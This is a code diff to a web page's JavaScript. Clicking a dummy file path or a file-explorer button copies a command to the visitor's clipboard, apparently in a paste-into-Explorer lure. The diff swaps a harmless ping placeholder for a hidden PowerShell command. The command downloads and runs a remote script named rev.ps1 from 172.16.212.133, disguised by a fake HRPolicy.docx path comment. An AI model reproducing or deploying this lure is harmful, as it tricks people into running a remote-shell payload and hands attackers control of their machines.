@@ -176,12 +176,16 @@
     // Copy the powershell command if they click on the dummy file path
     // In case the user tries to be smart and open file explorer manually
     path.addEventListener('click', function() {
-        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\ABC\\internal-ABC\\gdrive\\AnnualReturn.docx");
+        // navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx");
+     navigator.clipboard.writeText("powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://172.16.212.133/rev.ps1')\" # C:\\company\\internal-secure\\HRPolicy.docx");
+
     });
 
     // Copy powershell command & open file explorer
     fileExplorer.addEventListener('click', function() {
-        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\ABC\\internal-ABC\\gdrive\\AnnualReturn.docx");
+        // navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                              # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx");
+        navigator.clipboard.writeText("powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://172.16.212.133/rev.ps1')\" # C:\\company\\internal-secure\\HRPolicy.docx");
+
 
       fileInput.click();
     });
